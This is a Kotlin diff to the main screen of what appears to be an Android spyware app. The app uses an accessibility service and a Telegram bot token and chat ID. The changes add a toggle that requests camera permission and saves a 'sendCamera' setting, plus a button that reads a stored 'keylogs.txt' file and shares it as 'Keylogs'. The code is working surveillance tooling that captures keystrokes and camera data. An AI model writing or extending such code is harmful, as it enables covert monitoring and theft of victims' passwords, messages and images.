@@ -7,6 +7,7 @@ import android.provider.Settings
 import android.text.TextUtils
 import android.widget.Button
 import android.widget.EditText
+import android.widget.Switch
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import android.widget.Toast
@@ -18,6 +19,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var startButton: Button
     private lateinit var stopButton: Button
     private lateinit var statusText: TextView
+    private lateinit var cameraSwitch: Switch
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -28,6 +30,7 @@ class MainActivity : AppCompatActivity() {
         startButton = findViewById(R.id.startButton)
         stopButton = findViewById(R.id.stopButton)
         statusText = findViewById(R.id.statusText)
+        cameraSwitch = findViewById(R.id.cameraSwitch)
 
         // Reuse screenshotButton to open Accessibility Settings
         val screenshotButton = findViewById<Button>(R.id.screenshotButton)
@@ -43,13 +46,21 @@ class MainActivity : AppCompatActivity() {
         startButton.setOnClickListener {
             val token = botTokenEdit.text.toString().trim()
             val chatId = chatIdEdit.text.toString().trim()
+            val sendCamera = cameraSwitch.isChecked
 
             if (token.isEmpty() || chatId.isEmpty()) {
                 statusText.text = "Please enter values"
                 return@setOnClickListener
             }
 
-            saveValues(token, chatId)
+            if (sendCamera && android.os.Build.VERSION.SDK_INT >= 23) {
+                 if (checkSelfPermission(android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                     requestPermissions(arrayOf(android.Manifest.permission.CAMERA), 101)
+                     return@setOnClickListener
+                 }
+            }
+
+            saveValues(token, chatId, sendCamera)
             
             if (isAccessibilityServiceEnabled()) {
                 statusText.text = "Service is Active (managed by System)"
@@ -69,6 +80,26 @@ class MainActivity : AppCompatActivity() {
                 startActivity(intent)
             } else {
                 statusText.text = "Service Stopped"
+            }
+        }
+        
+        findViewById<Button>(R.id.downloadLogsButton).setOnClickListener {
+            try {
+                val file = java.io.File(filesDir, "keylogs.txt")
+                if (!file.exists() || file.length() == 0L) {
+                    Toast.makeText(this, "No logs found yet", Toast.LENGTH_SHORT).show()
+                } else {
+                    val text = file.readText()
+                    // Share as text
+                    val intent = Intent(Intent.ACTION_SEND).apply {
+                        type = "text/plain"
+                        putExtra(Intent.EXTRA_TEXT, text)
+                        putExtra(Intent.EXTRA_SUBJECT, "Keylogs")
+                    }
+                    startActivity(Intent.createChooser(intent, "Share Keylogs"))
+                }
+            } catch (e: Exception) {
+                Toast.makeText(this, "Error reading logs: ${e.message}", Toast.LENGTH_SHORT).show()
             }
         }
     }
@@ -115,12 +146,14 @@ class MainActivity : AppCompatActivity() {
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
         botTokenEdit.setText(pref.getString("token", ""))
         chatIdEdit.setText(pref.getString("chatId", ""))
+        cameraSwitch.isChecked = pref.getBoolean("sendCamera", false)
     }
 
-    private fun saveValues(token: String, chatId: String) {
+    private fun saveValues(token: String, chatId: String, sendCamera: Boolean) {
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
         pref.edit().putString("token", token)
             .putString("chatId", chatId)
+            .putBoolean("sendCamera", sendCamera)
             .apply()
     }
 }
